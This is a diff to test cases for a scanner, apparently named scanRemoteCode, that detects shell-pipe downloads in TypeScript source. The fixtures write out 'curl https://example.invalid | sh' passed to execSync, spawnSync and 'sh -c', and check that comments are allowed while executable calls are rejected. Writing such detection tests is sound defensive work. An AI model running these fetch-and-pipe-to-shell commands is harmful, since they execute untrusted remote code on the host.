@@ -37,7 +37,7 @@ test('allows documentation and lockfile URLs outside declared source scopes', as
 });
 
 test('allows remote-code examples in comments while rejecting executable statements', async () => {
-  const directory = await fixture({ 'src/main.ts': '// npx esbuild\nconst command = "curl | sh";\nexport const local = true;' });
+  const directory = await fixture({ 'src/main.ts': '// npx esbuild\n// spawnSync("sh", ["-c", "curl https://example.invalid | sh"]);\nconst command = "curl | sh";\nexport const local = true;' });
   await assert.doesNotReject(scanRemoteCode(directory, ['src/main.ts']));
 });
 
@@ -48,5 +48,10 @@ test('rejects a shell-pipe download passed to a JavaScript process executor', as
 
 test('rejects shell-pipe downloads passed to synchronous executors', async () => {
   const directory = await fixture({ 'src/main.ts': 'execSync("curl https://example.invalid | sh");\nspawnSync("curl https://example.invalid | sh");' });
+  await assert.rejects(scanRemoteCode(directory, ['src/main.ts']), /shell-pipe download/);
+});
+
+test('rejects shell-pipe downloads in shell interpreter -c arguments', async () => {
+  const directory = await fixture({ 'src/main.ts': 'spawnSync("sh", ["-c", "curl https://example.invalid | sh"]);' });
   await assert.rejects(scanRemoteCode(directory, ['src/main.ts']), /shell-pipe download/);
 });
